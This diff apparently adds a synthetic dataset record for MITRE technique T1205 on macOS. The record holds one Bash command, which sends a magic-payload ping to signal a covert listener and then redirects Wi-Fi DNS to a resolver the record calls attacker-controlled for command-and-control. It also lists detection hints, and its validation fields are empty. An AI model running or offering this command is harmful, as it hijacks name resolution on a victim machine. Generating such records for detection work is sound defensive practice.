@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "ping -c 1 -p DEADBEEFCAFEBABE 198.51.100.5 && networksetup -setdnsservers \"Wi-Fi\" 10.66.66.66",
+  "explanation": "Sends a magic-pattern ICMP packet (custom payload) to signal a listener and then updates DNS servers to reroute name resolution. Detection: inspect ICMP payload patterns for fixed magic values and monitor DNS server changes.",
+  "rationale_steps": [
+    "Use ping with a custom hex payload as a magic value recognizable by a covert listener.",
+    "On success, change DNS to an attacker-controlled resolver to support follow-on C2.",
+    "Detect by IDS signatures for abnormal ICMP payloads and configuration monitoring for DNS changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-d65eb033-7736afda",
+  "source_prompt_hash": "d65eb033",
+  "timestamp_utc": "2025-09-30T06:10:08.592373Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
